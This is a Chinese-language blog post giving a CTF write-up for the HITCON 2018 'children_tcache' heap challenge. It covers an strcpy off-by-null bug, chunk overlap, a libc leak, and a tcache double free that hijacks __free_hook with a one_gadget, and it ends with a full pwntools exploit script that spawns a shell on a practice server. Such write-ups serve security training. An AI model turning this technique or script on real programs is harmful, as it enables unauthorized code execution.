<!doctype html>
<head>
  <meta charset="utf-8">
  <meta name="description" content="&lt;h2 id=&#34;基本情况&#34;&gt;&lt;a href=&#34;#基本情况&#34; class=&#34;headerlink&#34; title=&#34;基本情况&#34;&gt;&lt;/a&gt;基本情况&lt;/h2&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;">
  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
  <title>HITCON_2018_children_tcache | powercat</title>

  <link rel="stylesheet" id="chosen-theme" href="https://rawgit.com/fiatjaf/classless/master/themes/plain/theme.css">
  <script>
let link = document.getElementById('chosen-theme')
let widget = document.createElement('div')
widget.style.position = 'absolute'
widget.style.right = '5px'
widget.style.top = '2px'
widget.style.background = 'beige'
widget.style.color = '#444'
widget.style.zIndex = 99
widget.style.padding = '4px 8px'
widget.innerHTML = `
<label>
  <p>No theme was set on <code>theme_config</code>.<br>
     Choose a theme from the list to experiment with it:</p>
  <select></select>
</label>
`
fetch('https://api.github.com/repos/fiatjaf/classless/contents/themes')
  .then(r => r.json())
  .then(files => {
    document.body.appendChild(widget)
    let select = document.querySelector('select')
    files
      .filter(f => f.type === 'dir')
      .forEach(f => {
        let option = document.createElement('option')
        option.value = f.name
        option.innerHTML = f.name
        select.appendChild(option)
      })
    let options = Array.from(select.querySelectorAll('option'))
    let chosen = options[parseInt(Math.random() * options.length)]
    chosen.selected = true
    link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen.value}`)
    select.addEventListener('change', e => {
      let chosen = e.target.value
      link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen}`)
    })
  })
  .catch(console.log)
  </script>

<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <header role="banner">
      <a href="/">
        
          <img src="https://picsum.photos/640/480">
        
      </a>  
    <h1>
      <a href="/">powercat</a>
    </h1>
    <aside>
      <p></p>
    </aside>
  </header>
  
  <main>
    <article>
  <header>
  
  <h1><a href="http://example.com/2022/01/17/HITCON_2018_children_tcache/">HITCON_2018_children_tcache</a></h1>
  <aside>
    
    <time datetime="222022-01-17">
      January 17th 2022
    </time>
    
    <ul>
    
      <li><a href="/tags/writeup/">writeup</a></li>
    
    </ul>
  </aside>
</header>

  <div><h2 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<p>基本堆管理器，又增删减改功能。用chunk_ptr_list和chunk_size_list两个链表维护，数量上限为12，使用的不是只递增的下标，而是哪个下标没有就用那个，即只能同时存在12个。</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>写入堆数据时，调用函数先写入到tmp局部变量，然后通过strcpy写入到堆上。写入函数本身没有问题，写入长度为size，将最后一字节替换为结束符。</p>
<p>问题出现在使用strcpy：</p>
<p>strcpy 字符串复制函数。复制时，遇到结束符 <code>\x00</code> 才会停止复制。复制结束后，会在最后写入一个结束符 <code>\x00</code> 。</p>
<p>缓冲区的长度为size，chunk空间为size，strcpy写入size后，会再次写入 \x00 ，造成 off by null ：</p>
<pre><code>write_chunk((__int64)&amp;tmp, size);
strcpy(ptr, &amp;tmp);
</code></pre>
<p>思路</p>
<p>off by null 想到堆重叠（overlapping），和 16 区别主要是申请的 unsorted bin 大小需要大于 0x408 来避免 chunk 放入 tcache 。</p>
<p>溢出修改 inuse 位比较简单，申请使用下一个 chunk prev_size 的堆直接写满就行，就是 prev_size 怎么写需要想一下办法。因为 free chunk 之前会使用 memset 往堆里填充 size 个 0xda 。</p>
<pre><code>布置 4 个堆，先释放 chunk0 做好向前 unlink 准备。
通过写 chunk1 实现：溢出修改 chunk2 inuse ，还原 chunk2 prev_size ，伪造 chunk2 prev_size
tcache bin double free 劫持 __free_hook 为 onegadget
</code></pre>
<p>整体堆分布和 16 的一样：</p>
<pre><code>chunk0 unsorted bin
chunk1
chunk2 unsorted bin
chunk3 protect1
</code></pre>
<p>chunk0 2 需要大于 0x408 能直接放入 unsorted bin 。chunk2 最低字节需要为 0x01 ，绕过 unlink 检查 next chunk inuse 位。</p>
<p>然后先把 chunk0 给释放了，后面在释放也可以</p>
<pre><code>add(0x410,&#39;s&#39;)
add(0xe8,&#39;k&#39;)
add(0x4f0,&#39;y&#39;)
add(0x60,&#39;e&#39;)

free(0)
</code></pre>
<p>溢出修改 inuse 就直接写满堆就行了：释放 chunk1 ，再次申请并写满。</p>
<p>free 的 memset 写入的字节长度是 chunk_size ，也就是申请多少，free 填充多少，但是 malloc 并不是这样，malloc 会自动对齐。举个例子：</p>
<pre><code>size=0xe8 -&gt; chunk_size=0xf0
size=0xe7 -&gt; chunk_size=0xf0
size=0xe6 -&gt; chunk_size=0xf01
</code></pre>
<p>结合以上特点，利用 off by null 逐步将溢出 inuse 时被填充为 0xdadadadadadadada 的 prev_size 还原回来（恢复 prev_size 高 5 字节就行了）</p>
<p>溢出修改 inuse ：</p>
<p>恢复最高字节：</p>
<pre><code>free(0)
add(0xe7,&#39;k&#39;*0xe7)
</code></pre>
<p>以此类推写成循环即可：</p>
<pre><code>free(1)
for i in range(0,6):
    add(0xe8-i,&#39;k&#39;*(0xe8-i))
    free(0)
add(0xe8,&#39;k&#39;*0xe0+p64(0x510))
</code></pre>
<p>构造完成利用条件，后面是常规 unsortbin 泄露：</p>
<pre><code>free(2)
add(0x410,&#39;leak libc&#39;)
show(0)

leak_addr = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
</code></pre>
<p>最后 getshell 利用 tcache double free 将堆分配到 free_hook 。虽然程序没有 UAF ，但是前面 unsortbin 利用完还有一大块堆在 bin 中，刚好堆头在 chunk1 （用来泄露地址那个堆），本身已经有一个指针了，然后再申请一个相同大小的堆就有第二个指针了。</p>
<pre><code>add(0x60,&#39;getshell&#39;)
free(0)
free(2)

add(0x60,p64(free_hook))
add(0x60,p64(free_hook))
onegadget = libc_base + 0x4f322#0x4f3c2
log.info(&quot;onegadget:&quot;+hex(onegadget))
log.info(&quot;free_hook&quot;+hex(free_hook))
add(0x60,p64(onegadget))

free(0)
</code></pre>
<p>EXP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,</span><br><span class="line">	terminal=[&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;])</span><br><span class="line"></span><br><span class="line"># p = process(&quot;./HITCON_2018_children_tcache&quot;)</span><br><span class="line"></span><br><span class="line"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./HITCON_2018_children_tcache&quot;)</span><br><span class="line">p = remote(&quot;node3.buuoj.cn&quot;,28300)</span><br><span class="line">libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">	p.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	p.sendline(&#x27;1&#x27;)</span><br><span class="line">	p.recvuntil(&quot;Size:&quot;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(&quot;Data:&quot;)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	p.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	p.sendline(&#x27;3&#x27;)</span><br><span class="line">	p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	p.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	p.sendline(&#x27;2&#x27;)</span><br><span class="line">	p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x410,&#x27;s&#x27;)</span><br><span class="line">add(0xe8,&#x27;k&#x27;)</span><br><span class="line">add(0x4f0,&#x27;y&#x27;)</span><br><span class="line">add(0x60,&#x27;e&#x27;)</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">for i in range(0,6):</span><br><span class="line">	add(0xe8-i,&#x27;k&#x27;*(0xe8-i))</span><br><span class="line">	free(0)</span><br><span class="line">add(0xe8,&#x27;k&#x27;*0xe0+p64(0x510))</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">add(0x410,&#x27;leak libc&#x27;)</span><br><span class="line">show(0)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">log.info(&quot;leak_addr:&quot;+hex(leak_addr))</span><br><span class="line">libc_base = leak_addr -0x3ebca0</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line"></span><br><span class="line">add(0x60,&#x27;getshell&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">add(0x60,p64(free_hook))</span><br><span class="line">add(0x60,p64(free_hook))</span><br><span class="line">onegadget = libc_base + 0x4f322#0x4f3c2</span><br><span class="line">log.info(&quot;onegadget:&quot;+hex(onegadget))</span><br><span class="line">log.info(&quot;free_hook&quot;+hex(free_hook))</span><br><span class="line">add(0x60,p64(onegadget))</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</div>
</article>

  </main>
  <aside>
    <p>This is an `aside`, a useful place to put information of any kind: metadata about the site author (with or without pictures), brief information about the purposes of the site, a static collection of external links or anything else.</p>
<p>For some Classless themes pictures and data about the author may suit better in the `cover` and `description` site attributes (see `config.toml`), but most of the times that kind of information will fit here better.</p>

  </aside>
  <footer role="contentinfo">
    <p>A default site footer. If you don't know what to place here maybe you should just write your name plus the current year?</p>
<p>If you want to have a sitemap, a contact form or other complex stuff, most Classless themes will also handle it nicely. Or you can take a look at the <code>aside.html</code> partial.</p>

  </footer>
</body>
